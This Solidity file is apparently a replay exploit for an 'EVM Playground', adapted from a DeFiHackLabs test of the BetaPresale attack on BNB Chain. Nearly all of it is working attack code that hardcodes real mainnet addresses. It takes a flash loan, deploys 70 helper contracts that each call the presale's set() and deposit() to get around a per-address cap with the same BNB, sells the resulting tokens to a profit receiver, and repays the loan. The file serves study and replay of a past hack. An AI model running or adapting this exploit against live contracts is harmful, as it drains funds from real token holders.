// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground.
//
// The original DeFiHackLabs test (test/BetaPresale_exp.sol) runs the whole
// attack inline via `new BetaPresaleAttack(profitReceiver)` in testExploit() —
// there is no single top-level `attack()` entrypoint on a harness-independent
// contract that the recorder can call directly (the constructor chain does
// all the work: BetaPresaleAttack's constructor deploys BetaPresaleFlashBorrower
// and calls execute(), and execute() itself deploys 70 BetaDepositCycler
// helpers, one per recycled deposit). This file collapses everything EXCEPT
// the mandatory per-msg.sender helper contracts into ONE top-level contract
// with a `run()` entrypoint, so "Go to vulnerability" / story beats resolve
// against the SINGLE deployed exploit address the playground can source-map
// (a helper deployed at its own runtime CREATE address has no verified/
// fetched source, so locators can't anchor on it). The 70 BetaDepositCycler
// helpers are still separate contracts because the vulnerability itself
// depends on each deposit() call coming from a DIFFERENT msg.sender (that's
// what lets the same 100 BNB reuse the 100 BNB per-address cap 70 times) —
// that structural requirement can't be collapsed away.
//
// profitReceiver is passed at deploy time (constructor arg), matching the
// original test's `new BetaPresaleAttack(profitReceiver)` where profitReceiver
// is a fuzzer-derived `makeAddr("profitReceiver")` address, NOT the ATTACKER
// EOA referenced in the DeFiHackLabs header comment (that address is only
// used for vm.label() trace readability and never appears as a msg.sender or
// constructor arg in the actual attack).

address constant PRESALE = 0x760c2aAA22220f24b9343b2A91a62dd664953853;
address constant BETA = 0x2410F2372E8A3C77fbD5D61B88714d14582F37Db;
address constant BETA_BUSD_PAIR = 0x0096F850E13E2d9127Fe0fb5523965cADD27ffc7;
address constant BETA_WBNB_PAIR = 0xb238A09D9eC8c15C1441aEE4A5af02A166291076;
address constant DODO_POOL = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
uint256 constant FLASH_LOAN_AMOUNT = 100 ether;
uint256 constant CHILD_DEPOSITS = 70;
uint256 constant FIRST_BETA_SALE = 7000 ether;

interface ITokenLike {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IWBNBLike is ITokenLike {
    function deposit() external payable;
    function withdraw(
        uint256 amount
    ) external;
}

interface IPresaleBEP20 {
    function set(
        address payable withdrawAddress
    ) external;
    function deposit() external payable;
}

interface IPancakePairLike {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IDPPFlashLoan {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

contract BetaPresaleDrain {
    address public immutable profitReceiver;

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    // Single recorded entrypoint. Mirrors the original test's
    // `new BetaPresaleAttack(...)` -> `new BetaPresaleFlashBorrower(...)` ->
    // `execute()` chain, flattened into one call on this contract.
    function run() external {
        IDPPFlashLoan(DODO_POOL).flashLoan(FLASH_LOAN_AMOUNT, 0, address(this), abi.encode(uint256(1)));
    }

    receive() external payable {}

    function DPPFlashLoanCall(
        address,
        uint256 baseAmount,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == DODO_POOL, "not DODO");
        require(baseAmount == FLASH_LOAN_AMOUNT, "unexpected loan");

        IWBNBLike(WBNB_TOKEN).withdraw(baseAmount);

        for (uint256 i = 0; i < CHILD_DEPOSITS; ++i) {
            BetaDepositCycler cycler = new BetaDepositCycler();
            cycler.depositAndSweep{value: FLASH_LOAN_AMOUNT}(payable(address(this)));
        }

        _swapBetaForBusd(FIRST_BETA_SALE);
        _swapBetaForWbnb(ITokenLike(BETA).balanceOf(address(this)));

        require(address(this).balance >= FLASH_LOAN_AMOUNT, "BNB was not recycled");
        IWBNBLike(WBNB_TOKEN).deposit{value: FLASH_LOAN_AMOUNT}();
        require(ITokenLike(WBNB_TOKEN).transfer(DODO_POOL, FLASH_LOAN_AMOUNT), "flash repay failed");
    }

    function _swapBetaForBusd(
        uint256 betaAmount
    ) private {
        IPancakePairLike pair = IPancakePairLike(BETA_BUSD_PAIR);
        (uint112 reserveBeta, uint112 reserveBusd,) = pair.getReserves();
        uint256 busdOut = _amountOut(betaAmount, reserveBeta, reserveBusd);

        require(ITokenLike(BETA).transfer(BETA_BUSD_PAIR, betaAmount), "BETA transfer to BUSD pair failed");
        pair.swap(0, busdOut, profitReceiver, "");
    }

    function _swapBetaForWbnb(
        uint256 betaAmount
    ) private {
        IPancakePairLike pair = IPancakePairLike(BETA_WBNB_PAIR);
        (uint112 reserveBeta, uint112 reserveWbnb,) = pair.getReserves();
        uint256 wbnbOut = _amountOut(betaAmount, reserveBeta, reserveWbnb);

        require(ITokenLike(BETA).transfer(BETA_WBNB_PAIR, betaAmount), "BETA transfer to WBNB pair failed");
        pair.swap(0, wbnbOut, profitReceiver, "");
    }

    function _amountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 998;
        return amountInWithFee * reserveOut / (reserveIn * 1000 + amountInWithFee);
    }
}

contract BetaDepositCycler {
    function depositAndSweep(
        address payable withdrawReceiver
    ) external payable {
        IPresaleBEP20(PRESALE).set(withdrawReceiver);
        IPresaleBEP20(PRESALE).deposit{value: msg.value}();

        uint256 betaBalance = ITokenLike(BETA).balanceOf(address(this));
        require(ITokenLike(BETA).transfer(withdrawReceiver, betaBalance), "BETA sweep failed");
    }
}
